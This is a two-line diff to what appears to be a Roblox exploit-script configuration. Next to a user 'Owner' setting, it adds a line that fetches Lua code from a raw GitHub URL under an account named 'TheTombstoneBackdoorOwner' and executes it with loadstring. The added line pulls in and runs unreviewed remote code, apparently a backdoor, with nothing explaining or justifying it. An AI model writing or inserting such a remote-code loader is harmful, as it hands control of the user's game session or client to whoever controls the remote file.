@@ -1,2 +1,3 @@
 GetGenv().Owner = "" -- your user
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TheTombstoneBackdoorOwner/Mango-Stand/refs/heads/main/Stand.txt"))()
